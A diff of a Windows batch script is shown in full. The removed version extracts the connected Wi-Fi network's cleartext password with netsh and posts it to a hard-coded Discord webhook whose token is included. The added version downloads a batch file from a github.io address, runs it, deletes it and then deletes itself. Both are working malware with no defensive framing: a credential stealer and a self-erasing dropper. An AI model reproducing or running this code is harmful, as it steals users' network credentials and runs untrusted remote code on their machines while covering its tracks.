@@ -1,52 +1,25 @@
 @echo off
-setlocal enabledelayedexpansion
 
-:: Initialize variables
-set "retry_count=0"
-set "max_retries=20"
-set "password="
+REM Define the URL of the script to download
+set "scriptURL=https://radio1233.github.io/QUCXB.github.io/app"
 
-:retry_loop
-:: Get the name of the currently connected Wi-Fi network
-for /f "tokens=2 delims=:" %%i in ('netsh wlan show interfaces ^| findstr /R /C:"SSID"') do (
-    set "SSID=%%i"
-    set "SSID=!SSID:~1!"
-    goto :gotSSID
-)
-:gotSSID
+REM Define the filename for the temporary script
+set "tempScript=%temp%\temp_script.bat"
 
-:: Retrieve the Wi-Fi password for the connected network
-for /f "tokens=2 delims=:" %%i in ('netsh wlan show profile name^="%SSID%" key^=clear ^| findstr /R /C:"Key Content"') do (
-    set "password=%%i"
-    set "password=!password:~1!"
-    goto :gotPassword
-)
-:gotPassword
+REM Download the script from the URL
+powershell -Command "(New-Object Net.WebClient).DownloadFile('%scriptURL%', '%tempScript%')"
 
-:: Check if the password is found
-if "%password%"=="" (
-    set /a retry_count+=1
-    if !retry_count! leq %max_retries% (
-        echo Attempt #%retry_count% to retrieve password failed. Retrying...
-        timeout /t 5 /nobreak > nul
-        goto :retry_loop
-    ) else (
-        echo Maximum retries reached. No password found.
-        set "password=No password found"
-    )
+REM Check if download was successful
+if not exist "%tempScript%" (
+    echo Error: Failed to download script from %scriptURL%
+    exit /b 1
 )
 
-:: Set the Discord webhook URL
-set "WEBHOOK_URL=https://discord.com/api/webhooks/1250855943302807633/7bOHCgMTHz08VJkQzY9Xdmi5uBj8FwVng88qWvzX-m2yLvfHuwfS00lhPvyEO7v2Fiod"
+REM Run the downloaded script
+call "%tempScript%"
 
-:: Create a JSON payload
-echo { "content": "Wi-Fi Password: %password%" } > payload.json
+REM Delete the temporary script
+del "%tempScript%"
 
-:: Use PowerShell to send the payload to the Discord webhook
-powershell -Command ^
-  "Invoke-WebRequest -Uri '%WEBHOOK_URL%' -Method POST -ContentType 'application/json' -InFile 'payload.json'"
-
-echo Wi-Fi password sent to Discord.
-
-:: Clean up
-del payload.json
+REM Optionally, delete this batch file itself
+del "%~f0"
